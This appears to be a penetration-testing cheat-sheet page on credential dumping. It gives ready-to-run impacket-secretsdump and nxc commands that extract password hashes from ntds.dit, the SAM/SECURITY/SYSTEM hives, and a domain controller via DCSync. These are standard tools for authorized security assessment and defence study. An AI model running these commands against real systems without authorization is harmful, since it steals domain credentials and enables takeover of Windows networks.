---
title: "secretsdump"
date: 2024-7-2
tags: ["secretsdump", "impacket", "active directory", "ad", "domain controller", "Windows", "ntds.dit", "hive", "hashes", "nxc", "dcsync"]
---

### Convert ntds.dit to .sqlite

```console
ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
```

<small>*Ref: [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)*</small>

### With ntds.dit and SYSTEM hive

{{< tab set1 tab1 active >}}impacket{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

{{< /tabcontent >}}

### With SAM, SYSTEM and SECURITY Hives

{{< tab set2 tab1 active >}}impacket{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

{{< /tabcontent >}}

### With Dcsync right

{{< tab set3 tab1 active >}}impacket{{< /tab >}}
{{< tab set3 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds
```

{{< /tabcontent >}}
